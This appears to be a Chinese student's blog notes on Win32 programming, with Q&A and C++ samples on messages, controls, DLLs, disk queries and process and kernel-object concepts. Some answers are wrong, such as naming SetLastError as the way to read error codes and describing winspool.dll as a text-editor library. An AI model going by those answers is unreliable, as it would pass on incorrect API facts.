错误码是不同的API有不同类型的错误返回值，在API结束之后获取，可以使用SetLastError函数获取，使用错误查找工具或者在VS监视栏中输入“err,hr”查看。<br> 2、如何为自己的函数定义windows 错误码，使用哪一个函数?<br> 答：SetLastError函数。<br> 3、在Virtual Stodio 中，在监视栏中输入什么字符，能够方便的查看错误码?<br> 答：err,hr字符。<br> 4、什么是句柄? 几个字节? 有什么用?<br> 答：在程序设计中，句柄是一种特殊的智能指针。当一个应用程序要引用其他系统（如数据库、操作系统）所管理的内存块或对象时，就要使用句柄。在windows编程中，一个句柄是指使用的一个唯一的整数值，即一个4字节(64位程序中为8字节)长的数值，来标识应用程序中的不同对象和同类中的不同的实例，诸如，一个窗口，按钮，图标，滚动条，输出设备，控件或者文件等。<br> 5、什么是实例? WinMain 函数的四个参数分别代表什么意思?<br> 答：实例诸如一个窗口，按钮，图标，滚动条等，hInstance是程序实例的句柄，它是程序的加载地址，hPrevInstance这个参数已经废弃，IpCmdLine是由调用者传入的命令，nCmdShow是由调用者传入的int型参数。<br> 6、请问TCHAR,_tcslen 本质是什么?由谁控制? 使用通用字符需要包含什么头文件?<br> 答：T版的数据或者函数，本质上还是ascii编码或者unicode的编码，主要靠#indefine和typedef实现的，它只由编译环境自动选择，tchar.h头文件。<br> 7、窗口回调函数的原型是什么?<br> 答：原型如下：<br> LRESULT CALLBACK WindowProc(<br> HWND hwnd,  //窗口句柄<br> UINT uMsg,  //消息ID<br> WPARAM wParam,  //消息参数1<br> LPARAM lParam  //消息参数2<br> );<br> 8、使用SPY++查看QQ 登录框类名是什么? 聊天窗口类名是什么?<br> 答： TXGuiFoundation         TXGuiFoundation<br> 9、窗口类结构体中hbrBackground 有什么用? 请尽量详细的说明。<br> 答：hbrBackground 可以刷新背景所用的画刷的句柄。Windows定义六种现有画刷：WHITE_BRUSH、LTGRAY_BRUSH、GRAY_BRUSH、DKGRAY_BRUSH、BLACK_BRUSH和NULL_BRUSH （也叫HOLLOW_BRUSH）。您可以将任何一种现有画刷选入您的装置内容中，就和您选择一种画笔一样。Windbws将HBRUSH定义为画刷的代号，所以可以先定义一个画刷代号变数：<br> HBRUSH hBrush ;<br> 您可以通过呼叫GetStockObject来取得GRAY_BRUSH的代号：<br> hBrush = GetStockObject (GRAY_BRUSH) ;<br> wndclass.hbrBackground = (HBRUSH) GetStockObject (GRAY_BRUSH);//设置窗口背景画刷的句柄</p><p>10、什么是队列消息? 什么是非队列消息? 请各举出三个例子。<br> 答：队列消息包括系统和线程的消息队列，队列送到系统消息队列，然后送到线程消息队列，而非队列消息是直接送给目的窗口的过程。队列消息如WM_MOUSERMOVE,WM_CHAR,WM_PAINT。非队列消息有WM_ACTIVATE,应用系统发送WM_WINDOWPOSCHANGED，SendMessage函数也会发送非队列消息。</p><p>11、PostMessage 和SendMessage 有什么区别?<br> 答：PostMessage只是把消息放入队列，不管其他程序是否处理都返回，然后继续执行；而SendMessage必须等待其他程序处理消息后才返回，继续执行。PostMessage的返回值表示PostMessage函数执行是否正确；而SendMessage的返回值表示其他程序处理消息后的返回值。 PostMessage会造成消息的滞后性,而SendMessage则不会,但如果SendMessage消息处理失败,则会造成程序停止。</p><p>12、下面这个结构体是窗口类结构体，请分别说明，各个字段是什么含义。<br> 答：各字段含义见注释。<br> typedef struct tagWNDCLASSW {<br> UINT style;//窗口类的风格（无符号32位整数）<br> WNDPROC lpfnWndProc;//指向窗口过程的指针<br> int cbClsExtra;//分派给窗口类的扩展的字节数<br> int cbWndExtra;//分派给窗口实例的扩展的字节数<br> HINSTANCE hInstance;.//实例句柄<br> HICON hIcon;//类图标的句柄<br> HCURSOR hCursor;//类鼠标指针的句柄<br> HBRUSH hbrBackground;//刷新背景所用的画刷的句柄<br> LPCWSTR lpszMenuName;//窗口类包含的菜单的名称<br> LPCWSTR lpszClassName;//窗口类名<br> }<br> WNDCLASSW</p><p>13、以下消息分别在什么时候触发<br> WM_LBUTTONDOWN   点击鼠标左键<br> WM_PAINT   绘制对象时<br> WM_CLOSE    点击关闭程序按钮</p><p>==================</p><p>1、窗口风格有三大风格，分别是什么? 各有什么特点?<br> 答：窗口三大风格是重叠窗口(Overlapped Window)，弹出窗口(Popup Window)，子窗口(Child Window)，重叠窗口是顶级窗口，是缺省类型，它有边框，标题栏，客户区等，还有其他组件；弹出窗口也是顶级窗口，通常用于对话框或者Message对话框，它具有WS_POPUP窗口风格，隐含带有WS_CLIPSIBLINGS窗口风格。</p><p>2、WM_COMMAND 作为控件的通知消息，wParam 与lParam 分别有什么含义?<br> 答：wParam是指32位的消息参数，是一个消息有关的常量值，也可能是窗口或控件的句柄， lParam 也是指32位的消息参数，通常是一个指向内存中数据的指针。</p><p>3、什么是模态对话框? 什么是非模态对话框? 用什么创建?，<br> 答：模态对话框创建后一定要在用户关闭对话框后，其父窗口才能响应用户操作，否则父窗口便无法响应任何用户的操作，模态对话框函数自带消息循环；非模态对话框则是创建完后其父窗口不需要像模态窗口那样等到对话框关闭才能响应用户的操作，一样可以在对话框未关闭前响应用户操作，非模态对话框函数需要自己写消息循环。模态对话框使用DialogBox创建，非模态对话框使用CreateDialog完成。</p><p>4、控件既可以用代码创建，也可以在对话框资源上拖拽，创建控件的函数是什么?。<br> 答：创建控件的函数是CreateWindow。</p><p>5、WM_NOTIFY 和WM_COMMAND 的区别。<br> 答：WM_COMMAND和WM_NOTIFY都是控件通知消息，WM_NOTIFY和WM_COMMAND相比，是一种更灵活的消息格式，lParam中放的是一个称为NMHDR结构的指针。在wParam中放的则是控件的ID。最初Windows 3.x就有的控件，如Edit，Combo，List，Button等，发送的控件通知消息的格式是WM_COMMAND；而后期的Win32通用控件，如List View，Image List，IP Address，Tree View，Toolbar等，发送的都是WM_NOTIFY控件通知消息。</p><p>6、使用通用(扩展)控件的准备工作都有哪些？<br> 答：在15版本以下的VS使用通用控件需要先包含&lt;CommCtrl.h&gt;,引入 #pragma comment(lib,”comct132.lib”)，调用InitCommonControls初始化通用控件，使用CreateWindowEx函数创建通用控件。</p><p>==================<br> 1、什么是API? 什么是动态链接库? 写出常见的动态链接库及其大体功能。<br> 答：API是指API（Application Programming Interface，应用程序编程接口）是一些预先定义的函数，目的是提供应用程序与开发人员基于某软件或硬件得以访问一组历程的能力，而又无需访问源码，或理解内部工作机制的细节。<br> 动态链接库的英文名称叫DynamicLinkableLibrary，它是microsoft在windows操作系统中实现共享函数库概念的一种实现方式。大多数与windows相关的磁盘文件如果不是程序模块，就是动态链接程序。<br> 常见的动态链接库及其大体功能：<br> kernel32.dll    Windows9x/Me中非常重要的32位动态链接库文件，属于内核级文件。它控制着系统的内存管理、数据的输入输出操作和中断处理<br> user32.dll       Windows用户界面相关应用程序接口，用于包括Windows处理，基本用户界面等特性，如创建窗口和发送消息。<br> gdi32.dll         Windows GDI图形用户界面相关程序，包含的函数用来绘制图像和显示文字<br> winspool.dll    一款文本编辑软件的库文件<br> comdlg32.dll   Windows应用程序公用对话框模块，用于例如打开文件对话框</p><p>都包括什么?<br> 2、你所知道的文件操作<br> 答：文件操作包括新建打开文件CreateFile，删除指定文件DeleteFile，复制文件CopyFile，ReadFile读取文件，WriteFile写文件，GetFileAttribute获取文件属性，SetFileAttribute设置文件或目录的属性。</p><p>3、什么是进程? 什么是线程?<br> 答：进程是资源的分配和调度的一个独立单元，而线程是CPU调度的基本单元，同一个进程中可以包括多个线程，并且线程共享整个进程的资源（寄存器、堆栈、上下文），一个进程至少包括一个线程。</p><p>4、Dll 可以导出什么?<br> 答：Dll可以导出类和函数。</p><p>5、在编写dll 时，当我们想要导出一个东西时，有哪些方式? 分别如何实现?<br> 答：一、可以使用_declspec(dllexport)，在函数声明前加_declspec(dllexport)。二、使用模块定义文件（扩展名为.def）导出，文件里面写<br> LIBRARY<br> DESCRIPTION “DLL”<br> EXPORTS<br> 函数名</p><p>6、我们使用dll 的时候，通常有两种方式。分别如何实现?<br> 答：见上一题。</p><p>7、什么叫做对象库? 什么叫做导入库?<br> 答;对象库是一个扩展名为.LIB的文件，在这个文件的代码在运行链接器进行静态链接时被添加到程序的.EXE文件中。导入库是一种特殊的形式的对象库文件，后缀名和对象库一样，链接器用它来解析源代码中的函数调用。但是导入库不包含任何代码，它们只给链接器提供信息来建立EXE文件中用于动态链接的重定位表格。</p><p>8、什么叫做名称粉碎? 有什么用处?<br> 答：名称粉碎是函数名称相同的函数在C中出现重定义，然而在C++中用于函数重载，相同的名称会粉碎成不同的函数内存地址，从而区别调用的是什么函数，由此可以实现多态。</p><h2 id="问答2"><a href="#问答2" class="headerlink" title="问答2"></a>问答2</h2><ol><li><p>怎么将”123”转换成123? 反过来呢?</p><p>使用sscanf_s函数将字符转换位数字，宽版使用stscanf_s</p><p>反过来就是先转换为数字后，反向遍历</p><p>（老师批注：stscanf_s是通用版本，根据项目默认编码方式自动匹配，wsprintf是宽版，用到通用版本才需要tchar，单纯用宽版函数是不需要tchar.h的）</p></li><li><p>“哈哈”和L”哈哈”一样吗? 哪里不一样? 怎么转换?</p><p>答：不一样，窄版和宽版，如果需要使用宽板只需在字符前加上L即可，但需包含头文件tchar.h</p></li><li><p>创建窗口的流程是什么?</p><p>1,使用WNDCLASS结构体定义窗口</p><p>2，将定义的窗口注册</p><p>3，将注册的窗口创建出来</p><p>4，更新并显示窗口</p><p>5，创建消息循环</p><p>6，回调</p></li><li><p>怎么响应窗口消息?</p><p>答：不同的消息有不同的响应方式，例如：当窗口创建的时候会产生WM_CREATE消息，点击按钮（button）时会产生WM_COMMAND消息，</p></li><li><p>wParam和lParam保存了什么信息?</p><p>答：如在响应WM_COMMAND消息时WPARAM的高位是通知码，低位是ID，LPARAM保存的是句柄</p></li><li><p>怎么响应控件的单击消息?</p><p>答：单击控件时会产生WM_COMMAND消息，在这个消息中他的WPARAM的低位是被单机控件的ID，把这个ID找出来后，通过这个ID使用GetDlgItem这个函数获取该控件的句柄从而进行想要的消息响应</p></li><li><p>如何创建单选框? </p><p>在工具栏中拖拽，然后通过WPARAM的低位ID响应，然后通过WPARAM的高位通知码获取单选框是否被点击</p></li><li><p>怎么将单选框设置为选中状态?  </p><p>答：给单选框发送一个SendMessage消息第二参数BM_SETCHECK第三个参数就是设置选中的状态码1</p></li><li><p>如何获取复选框是否被选中? </p><p>使用BM_GETCHECK参数给复选框发送SendMessage消息，用BOOL值接收</p></li><li><p>如何给窗口添加主菜单?</p><p>答：资源创建，通过ID获取句柄，创建窗口时加上这个句柄</p></li><li><p>怎么在程序中加载图片资源?</p><p>答：</p><p>//加载图片</p><p>HBITMAP hBit_map = LoadBitmap(g_hInstance, MAKEINTRESOURCE(IDB_BITMAP1));</p><p>//获取图片框资源句柄</p><p>HWND hPic=GetDlgItem(hMain, IDC_STATIC1);</p><p>//设置图片</p><p>SendMessage(hPic, STM_SETIMAGE, IMAGE_BITMAP, (LPARAM)hBit_map);</p></li><li><p>怎么在窗口中弹出右键菜单</p><p>在WM_RBUTTONDOWN消息中响应右击，在这个消息中获取右击的坐标，使用这个坐标弹出窗口（TrackPopupMeun）</p></li><li><p>怎么设置和获取编辑框的文本</p><p>获取编辑框句柄GetDlgItem</p><p>创建接收文本的缓冲区WCHAR 数组</p><p>获取编辑款文本GetWindowText</p></li><li><p>下拉框怎么添加文本?</p><p>获取句柄在使用ComboBox_AddString函数添加文本</p></li><li><p>怎么结束一个对话框?</p><p>EndDiaLog</p></li><li><p>怎么获取或修改窗口的窗口风格?</p><p>获取需要修改控件的句柄，然后使用SetClassLong修改</p></li><li><p>怎么替换一个控件的消息回调函数?</p><p>​                            控件句柄       修改的属性                回调函数</p><p>SetWindowLong(hButton1, GWL_WNDPROC, (LONG)ButtonProc);</p></li><li><p>怎么创建DLL工程?</p><p>在新建的时候选择dll，</p></li><li><p>怎么导出函数?</p><p>两种导出方法</p><p>在头文件中声明导出_declspec(dllexport)</p><p>模块定义导出，添加一个def文件，在文件中写入EXPORTS（后跟需要导出的函数，且函数后标号）</p><p>之后再属性配置里–&gt;连接器–&gt;输入，中有一个模块定义文件，把这个选项值写成.def文件全称（xxx.def）</p></li><li><p>怎么调用从DLL导出的函数?</p><p>两种调用方式</p><p>隐式调用</p><p> 包含头文件，头文件中含有导出函数的声明。</p><pre><code>   载入lib文件  #pragma  comment（lib,“”）;   直接调用函数即可</code></pre><p>显示调用</p><p> 使用LoadLibrary（）将目标dll强行加载到进程中。<br>  在 GetProcAddress()获得函数的地址。然后使用返回的函数指针调用</p><p>（老师批注：dll显式链接方式不要忘了FreeLibrary）</p></li><li><p>怎么调试DLL</p><p>（老师批注：可以通过编写调用dll函数的程序进行调试）</p></li><li><p>exe加载DLL时(使用相对路径),被加载的DLL可以放在任何目录吗,如果不能,那么都能放到哪些目录?</p><p>只能放在相对exe的相对路径中</p></li><li><p>怎么使用静态库? 和动态库相比有和区别?</p><p>使用方法是一样的，只是使用静态库编译后的程序会比动态库的程序占用空间大，因为静态库是直接把库文件载入到了程序中，而不是需要从外部调用</p></li></ol><h1 id="五、磁盘信息"><a href="#五、磁盘信息" class="headerlink" title="五、磁盘信息"></a>五、磁盘信息</h1><h2 id="获取盘符的字符串，"><a href="#获取盘符的字符串，" class="headerlink" title="//获取盘符的字符串，"></a>//获取盘符的字符串，</h2><p>GetLogicalDriveStrings( 100,buf);</p><p>// 把语言设置为中文</p><p>setlocale(LC_ALL, “chs”);</p><h2 id="获取驱动器类型"><a href="#获取驱动器类型" class="headerlink" title="// 获取驱动器类型"></a>// 获取驱动器类型</h2><p>，由于这里需要的是一个指针，所以需要在定义一个TCHAR*指针类型指向数组（缓冲区）</p><p>用整形接收返回值，</p><p>​    2，代表可移动设备 DRIVE_REMOVABLE</p><p>​    3，硬盘 DRIVE_FIXED</p><p>​    4，远程设备DRIVE_REMOTE</p><p>​    5，光驱 DRIVE_CDROM</p><p>GetDriveType(pTemp);</p><h2 id="计算磁盘空间"><a href="#计算磁盘空间" class="headerlink" title="//计算磁盘空间"></a>//计算磁盘空间</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GetDiskFreeSpace(pTemp,<span class="comment">//盘符</span></span><br><span class="line">&amp;每簇的扇区数量, </span><br><span class="line">&amp;每个扇区的容量, </span><br><span class="line">&amp;空闲簇的总量,   </span><br><span class="line">&amp;全部簇的总量 </span><br></pre></td></tr></table></figure><h2 id="查看磁盘的实例代码"><a href="#查看磁盘的实例代码" class="headerlink" title="//查看磁盘的实例代码"></a>//查看磁盘的实例代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 02_获取磁盘信息.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 获取驱动器名称</span></span><br><span class="line">TCHAR buf[<span class="number">100</span>] = &#123;&#125;;</span><br><span class="line">TCHAR* pTemp = buf;</span><br><span class="line">GetLogicalDriveStrings( <span class="number">100</span>,buf);</span><br><span class="line"><span class="comment">// 把语言设置为中文</span></span><br><span class="line">setlocale(LC_ALL, <span class="string">&quot;chs&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (pTemp[<span class="number">0</span>]!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">wprintf(_T(<span class="string">&quot;%s  &quot;</span>), pTemp);</span><br><span class="line"><span class="comment">//2. 获取驱动器类型</span></span><br><span class="line">DWORD dwType = GetDriveType(pTemp);</span><br><span class="line"><span class="keyword">switch</span> (dwType)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOVABLE:</span><br><span class="line">wprintf(_T(<span class="string">&quot;可移动设备 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_FIXED:</span><br><span class="line">wprintf(_T(<span class="string">&quot;硬盘 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_REMOTE:</span><br><span class="line">wprintf(_T(<span class="string">&quot;远程设备 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DRIVE_CDROM:</span><br><span class="line">wprintf(_T(<span class="string">&quot;光驱 &quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//3. 驱动器的空间信息</span></span><br><span class="line">DWORD 每簇的扇区数量 = <span class="number">0</span>;</span><br><span class="line">DWORD 每个扇区的容量 = <span class="number">0</span>;</span><br><span class="line">DWORD 空闲簇的总量 = <span class="number">0</span>;</span><br><span class="line">DWORD 全部簇的总量 = <span class="number">0</span>;</span><br><span class="line">GetDiskFreeSpace(pTemp,</span><br><span class="line">&amp;每簇的扇区数量, </span><br><span class="line">&amp;每个扇区的容量, </span><br><span class="line">&amp;空闲簇的总量,   </span><br><span class="line">&amp;全部簇的总量     </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;总容量为%.2lf,空闲容量为%.2lf&quot;</span>,</span><br><span class="line">(((全部簇的总量/<span class="number">1024.0</span>) * 每簇的扇区数量 * 每个扇区的容量)/<span class="number">1024</span>)/<span class="number">1024</span>,</span><br><span class="line">(((空闲簇的总量/<span class="number">1024.0</span>) * 每簇的扇区数量 * 每个扇区的容量) / <span class="number">1024</span>) / <span class="number">1024</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">pTemp += wcslen(buf)+<span class="number">1</span>;</span><br><span class="line">        <span class="comment">/*wcslen遇到0会被截断，缓冲区存储的时“C:\0D:\”,所以wcslen(buf)的长度等于3，pTemp+=wcslen(buf)+1之后就是下一个盘符的开始*/</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="六、动态链接库"><a href="#六、动态链接库" class="headerlink" title="六、动态链接库"></a>六、动态链接库</h1><p>定义 DLL 应用程序的入口点</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="comment">//dll文件是给他人提供函数所用，不会作为一个程序单独运行，也就没有第一行执行代码的概念</span></span><br><span class="line"><span class="comment">//通常不需要理会DllMain，不会再里面写什么代码</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule, DWORD  ul_reason_for_call,LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:  <span class="comment">//进程加载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:  <span class="comment">//线程加载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:  <span class="comment">//线程卸载</span></span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:  <span class="comment">//进程卸载</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="声明导出"><a href="#声明导出" class="headerlink" title="声明导出"></a>声明导出</h2><p>在需要导出函数的头文件中声明</p><p>extern “C” _declspec(dllexport) <strong>void pr();</strong>//需要声明的函数即返回类型</p><p>注意一定要在cpp文件中包含头文件，不然找不到该函数的定义</p><h2 id="模块定义文件导出"><a href="#模块定义文件导出" class="headerlink" title="模块定义文件导出"></a>模块定义文件导出</h2><p>添加一个.def文件 ，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">Fun1 @<span class="number">1</span></span><br><span class="line">Fun2 @<span class="number">2</span></span><br></pre></td></tr></table></figure><p>Fun1和Fun2是函数名，@1表示导出函数的序号</p><p>在属性配置里–&gt;连接器–&gt;输入，中有一个模块定义文件，把这个选项值写成.def文件全称（xxx.def）</p><p>调用dll中函数的方式，有两种：</p><h2 id="隐式调用"><a href="#隐式调用" class="headerlink" title="隐式调用"></a>隐式调用</h2><p>​       包含头文件，头文件中含有导出函数的声明。<br>​       载入lib文件  #pragma  comment（lib,“”）;<br>​       直接调用函数即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;..\Dll1\Dll1.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;..\\Debug\\Dll1.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fun1();</span><br><span class="line">    fun2();</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="显示调用"><a href="#显示调用" class="headerlink" title="显示调用"></a>显示调用</h2><p>使用显示调用不需要头文件，但是你需要知道函数的原型（返回值类型，各个参数的类型）。<br>       LoadLibrary（）将目标dll强行加载到本进程中。<br>       GetProcAddress()获得函数的地址。<br>       自然就可以调用此函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">typedef  void(*FUN)();</span><br><span class="line"></span><br><span class="line">FUN g_Fun;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    HMODULE hModule &#x3D;  LoadLibrary(L&quot;Dll1.dll&quot;);</span><br><span class="line">    g_Fun &#x3D;  (FUN)GetProcAddress(hModule, &quot;fun1&quot;);</span><br><span class="line">g_Fun();</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="lib文件的差别："><a href="#lib文件的差别：" class="headerlink" title="lib文件的差别："></a>lib文件的差别：</h2><p>   随着dll一起生成的lib文件，称之为导入库，里面是没有代码和数据，是链接信息，供编译器再exe文件与dll文件做链接的。<br>   还有一种是静态对象库，编译的时候会将静态库中的使用到的代码数据编译到exe中，exe发布就不需要携带很多文件。</p><h1 id="七、进程"><a href="#七、进程" class="headerlink" title="七、进程"></a>七、进程</h1><p>1  内核对象的概念</p><p>2  进程，模块，线程</p><p>  概念</p><p>  基本操作：</p><p>  进程  模块  线程的遍历</p><p>  进程的终止  强制结束  进程间的通讯</p><p>  线程挂起  恢复  终止  强制结束</p><p>3  文件操作</p><p>  难点：递归遍历文件</p><p>4  线程同步：原子操作  临界区  互斥体  事件  信号量</p><p>5  同步IO和异步IO</p><p>6  基本的网络编程 TCP  UDP</p><p>7  IOCP模型 </p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>一、 如何理解内核对象的概念？</p><p>a. windows操作系统的设计是面向对象的，很多的组件都是以对象的方式去管理的。将整个操作系统的内核看成是一个封装体，API函数就是对外的接口。然后通过给API传递句柄去实现操作具体的某一个对象，句柄就是对象的标识。windows管理的对象也有很多类型，不同类型的对象的管理方式是不同的。</p><p>b. 所有的API函数都是隶属于不同的动态链接库（DLL文件）的。有三大DLL文件：</p><p>  User32.dll    GDI32.dll    kernel32.dll</p><p>  其中User32.dll和窗口，控件等有关，GDI32和绘制图形有关，Kernel32和操作系统的界面无关的很多机制有关。</p><p>  这三种DLL创建出来的对象就可以分为3大类。管理方式就不一样。那么我们的内核对象有自己的管理方式。</p><p>c. 一个进程，是一个运行中的程序。</p><p>  一个进程包含了一个运行中的程序所用到的所有资源：一个内存空间   内存空间中有很多的模块   内存空间被分成了两大部分—用户层和内核层</p><p>  我们正常的普通程序只能访问用户层空间（00000000<del>7FFFFFFF）。大部分的对象（结构体变量）都是放在内核空间的（80000000</del>FFFFFFFF）。</p><p>  所以我们自然不能直接访问到对象，而是通过句柄。</p><p>  所有的进程内核层是共享的，不同的进程用户层空间是不一样。</p><p>2 内核对象有什么特点？？</p><p>  特点1—内核对象是跨进程的：所有的内核对象存在于内核层的。既然内核层是大家共享的，所以内核对象也是可以跨进程的。</p><p>  特点2—跨进程机制怎么管理呢？？：通过引用计数和内核对象句柄表管理的。</p><p>进程A的句柄表</p><table><thead><tr><th>1</th><th>内核对象A的地址</th><th></th></tr></thead><tbody><tr><td>2</td><td>内核对象B的地址</td><td></td></tr></tbody></table><p>进程B的句柄表</p><table><thead><tr><th>1</th><th>内核对象B的地址</th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr></tbody></table><p>进程C的句柄表</p><table><thead><tr><th>1</th><th>内核对象M的地址</th><th></th></tr></thead><tbody><tr><td>2</td><td>内核对象N的地址</td><td></td></tr><tr><td>3</td><td>内核对象L的地址</td><td></td></tr></tbody></table><table><thead><tr><th>4</th><th>内核对象B的地址</th><th></th></tr></thead><tbody><tr><td></td><td></td><td></td></tr></tbody></table><p>如果一个内核对象被n个进程使用，引用计数就是n。没有被进程使用，引用计数就是0，没被任何进程使用，内核对象就会自动销毁。</p><p>特点3：每一个内核对象都有安全描述属性，我们通过创建对象的API是否包含这样一个参数，就能确定它是不是内核对象</p><p>3  通过我们怎么获得内核对象的句柄的</p><p>  a.  自己创建的</p><p>  b.  自己打开的（这个对象是已经创建好的）</p><p>  c.  从父进程继承过来的。</p><p>  d.  别的进程复制过来的。DuplicateHandle</p><h3 id="进程概念："><a href="#进程概念：" class="headerlink" title="进程概念："></a>进程概念：</h3><p>进程，简单来说，就是一个运行中的程序，包含了：</p><p>  a.  一个虚拟的内存空间  所有程序的代码和数据都在这片内存空间中。</p><p>  b. 内存空间中排布了很多的模块</p><p>  c.  至少有一个线程</p><p>在进程的虚拟内存中，一般会加载一个exe，很多的dll。他们都称之为模块。</p><p>进程本身是一个综合了各种资源的东西，是不能执行代码，能够执行代码的是归属于进程的线程。</p><p>每一个线程都是一个独立的执行单元：</p><p>   1  每一个线程有自己的一块堆栈。</p><p>   2  每一个线程有自己的执行环境。</p><p>CPU在执行代码的时候，主要是依赖于一套寄存器：</p><p>   通用寄存器：eax  ebx  ecx  edx  esi  edi  esp  ebp  </p><p>   指令指针寄存器：eip 存储着下一条要执行的指令</p><p>   段寄存器：cs  ss  ds  es  fs  gs</p><p>   …..</p><p>所有的线程都是操作系统统一去管理调度的，每一个线程都有自己的优先级。根据优先级决定先调用谁后调用谁。</p><p>线程发生切换，实际就是切换线程的执行环境，比如现在有A，B，C三个线程，此时线程A在执行，线程A的时间片用完了，就保存A的执行环境，看B和C的优先级谁高，假如是C高，那么就把C的线程环境加载到CPU中。</p><h2 id="基本操作："><a href="#基本操作：" class="headerlink" title="基本操作："></a>基本操作：</h2><p>  